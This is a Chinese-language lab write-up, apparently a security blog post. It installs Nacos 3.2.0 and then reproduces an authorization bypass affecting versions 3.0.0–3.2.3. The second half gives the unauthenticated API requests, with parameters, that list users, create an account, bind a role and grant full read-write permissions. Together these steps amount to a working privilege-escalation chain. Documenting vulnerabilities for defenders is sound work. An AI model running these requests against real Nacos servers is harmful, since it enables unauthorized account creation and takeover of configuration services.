#  记一次nacos3.x的搭建和漏洞复现过程(超详细)  
原创 xiaolong
                    xiaolong  淋烟雨漫江南   2026-11-11 07:46  
  
这篇文章主要是记录搭建nacos和复现QVD-2026-59388最新权限绕过漏洞的过程  
  
本次靶机采用Centos7+JDK17版本  
搭建  
  
Cnetos7安装JDK17  
```
sudo cat <<EOF > /etc/yum.repos.d/adoptium.repo
[Adoptium]
name=Adoptium
baseurl=https://packages.adoptium.net/artifactory/rpm/centos/7/x86_64
enabled=1
gpgcheck=1
gpgkey=https://packages.adoptium.net/artifactory/api/gpg/key/public
EOF
```  
```
sudo rpm --import https://packages.adoptium.net/artifactory/api/gpg/key/public
```  
```
sudo yum clean all
sudo yum makecache
sudo yum install temurin-17-jdk -y
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXYmrrXUgiabDtXia987In6bjPDuuwIQDMeZqibNXS2FZka6a5k1Dn2aB6kPSefMBKZvUuKWXjuMNo4aJ5MEulYl9AFibT3m41juKjM/640?wx_fmt=png&from=appmsg "")  
  
在github上下载源码 这里用的是3.2.0版本  
```
https://github.com/alibaba/nacos/releases/tag/3.2.0
```  
  
下载完成之后使用tar进行解压  
```
tar -zxvf nacos-server-3.2.0.tar.gz
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXbZXRVXbDycAYrniavFPJvYp9uBicXS5mWQk20SbWOrgtjJ3uPlMlRA6VS1YG5tWjF9fsdo1U5cEGJ8TZnJ5LibNpz0h3iboxo588c/640?wx_fmt=png&from=appmsg "")  
  
关于nacos的目录结构  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXbqqbIlO4cJ9PmT7fFpqQsNHPQgJMW29D1n6VNvKhIVMYXp6pq9qEicY7mR2M4at2UcJKTOIbgFIEfXkNicR7cdicnWVibVbsSFogc/640?wx_fmt=png&from=appmsg "")  
```
nacos/
├── bin/          # 启动脚本
├── conf/         # 配置文件
├── target/       # 运行 jar
├── logs/         # 日志
├── plugins/      # 插件
└── data/         # 数据
```  
  
进入/nacos/bin目录  
```
cd /nacos/bin
chmod +x ./*
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXaqUBVnkFyG1adTTRmUC00smO1j6onRWq2XEgiaZXNJGXS4D0xcGzDOjpBficMB3JnWTEpic1G1HGZLrLrOKWBQKV9ry3LdTC9DJo/640?wx_fmt=png&from=appmsg "")  
  
需要保证bin目录下文件拥有可执行权限  
  
在  
Nacos 3.x 默认开启控制台鉴权，启动时会要求配置三个参数  
```
vim conf/application.properties //修改配置文件
```  
  
nacos.core.auth.enabled  
=false  
nacos.core.auth.plugin.nacos.token.secret.key  
=  
Base64密钥  
nacos.core.auth.server.identity.key  
=  
identityKey  
nacos.core.auth.server.identity.value  
=  
identityValue  
  
  
默认为false不用修改  
```
openssl rand -base64 48 //随机生成48位编码
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXa2VVs2IVcRJP3icX7b5x75YibJT8kCce7M5ZicXQLHmY0llfBXmib7aUUqIGUVnQRNIVBJghpP2FWAsIaOZ9nyVU62nx3qiaL4MalQ/640?wx_fmt=png&from=appmsg "")  
  
注释的为官方自带的key懒得配置的师傅也可以使用默认的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXZPiaPU5ibWCJdcMA0Rvgp0wwpAOfyXFLYA6T7xlE2LgsOiaM5Kia4TickQa35n3CYrTzHlwmf7Tnh17P9T2L75E5XI1WKgHI9GicVqQ/640?wx_fmt=png&from=appmsg "")  
  
定义 Key/Value(可以不配置)  
  
  
启动nacos  
```
cd ./bin
bash startup.sh -m standalone //如果报错的话换sh
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYk7Q1gkkjDRPAReMxdryn9icLlMWoHic1VWXEzV4bMN9SK7SQ7C1T6vqefEiay7a3ooL2Cia8Oia81rnehSpnZMLmzuanfmazaQTQs/640?wx_fmt=png&from=appmsg "")  
  
启动完成之后查看日志是否启动成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXZl0Nc4xW0X5R23UOBMgMfsCL3rVVlYPiaAq3vEMNz8pp7UM7WCibjIVLOj2EbT32lYfBtryXoCc6vYMd7ZIxD1S72qC7YfSfNibU/640?wx_fmt=png&from=appmsg "")  
  
启动成功之后在查看端口号是否开发  
  
在3.0之后控制台改为8080端口了所以只需要访问8080端口即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXbdlXZ3PWgibIo68TbpFcycuzuicXDN4rtCD9zvtKSQYgvJKT7icFVnAGw4prvoxZ0k1N3D2BvibZdJKD5SXlojem5CjfCt4xnW5YM/640?wx_fmt=png&from=appmsg "")  
  
配置密码之后登录即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXaUAicj0F1Tfia3SfxgvDzXEQgLQe8pricQBxCBiaZS864xicA6hmsVGKibdtVhCYBZTEhRI4ZZf2OtM7zaciclicxibGlOQNZuXUn1icaAQ/640?wx_fmt=png&from=appmsg "")  
  
具体复现过程如下  
  
漏洞描述  
  
Nacos 3.x 把接口鉴权分成了多个作用域，但用户、角色、权限相关的管理接口没有正确归入 ADMIN_API  
 作用域，导致即使开启了 Admin/Console 鉴权，这些接口仍可能被未授权访问。  
  
影响版本：Nacos 3.0.0 ~ 3.2.3  
  
修复版本：Nacos 3.2.4  
  
一、未授权访问  
```
http://192.168.80.166:8848/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYpZOE8alrQmNcL3a4NPjzPa0MBMxA3NweYEgjeia1A0iagVJYsiasYXpJBjKAIGlTibCSlcM91l5cmdFSKzXQmf4WDyCGia7dC7QNk/640?wx_fmt=png&from=appmsg "")  
  
返回403说明接口存在鉴权  
  
二、未授权读取用户列表  
```
http://192.168.80.166:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=10
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXaiagBrI7jlonpX2zcmKLDafvlhGZnmP3GsHya9fQd6H5ic3CeUwO58oaQLvpLgh0nMY8ukQzabVg52LbbRufLDAg7P7JiauKgjJQ/640?wx_fmt=png&from=appmsg "")  
  
三、未授权创建用户  
```
http://192.168.80.166:8848/nacos/v3/auth/user //get
username=test&password=test //post
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXYySaOPXHHP3QnfJFJKG5DeB0P7DHeRgic9dZ0DWicPPRBW7ggqnsp6Zp1Srk9AVJzIsKEglicic0nZ5eLGibbKQpQLAyBtsLRzVLwU/640?wx_fmt=png&from=appmsg "")  
  
直接登录nacos会提示没有权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXZhib6zoddZzicibEibB11fCHYzKrcoIpzPoic04PLW89WCkibIojXwiccH8SnpM0vmicic3rC1xeWfMROsdjicZ1fIiaIKSBAEGq3Qd2wicO8/640?wx_fmt=png&from=appmsg "")  
  
四、未授权创建角色并绑定用户  
```
http://192.168.80.166:8848/nacos/v3/auth/role //get
cole=test&username=test //post
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXbmGhPIPaVic6hGsQgS7r0J1w4gC68F5DVawuIKzruTfxI6icytcYufB82uqkhYeibfIrVIdbY5Vkhbb1vZiaicxnGAibtok3yYGhkPw/640?wx_fmt=png&from=appmsg "")  
  
五、未授权添加读写权限  
```
http://192.168.80.166:8848/nacos/v3/auth/permission //get
role=test&resource=*&action=rw //post
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXZcT1VmThPibBh8H2dWLjCBWg8orNCP57lJibbpibiaApP4JgqfEWny2GOQGMW3RicnlZicrx4gjG8Dryfm3fJdoBl4CV2Nk17vZrQfo/640?wx_fmt=png&from=appmsg "")  
  
重新登录nacos拥有读写权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYuqQKUAzG5FInHdkWVxuSMkHdHJcOKzTJTxvLe2JT8AZrYoINWctpN49F6e0gUR63bcoTc1oQ1c9P9b0VqSGDKzFwcXIBOgZg/640?wx_fmt=png&from=appmsg "")  
  
结束。  
  
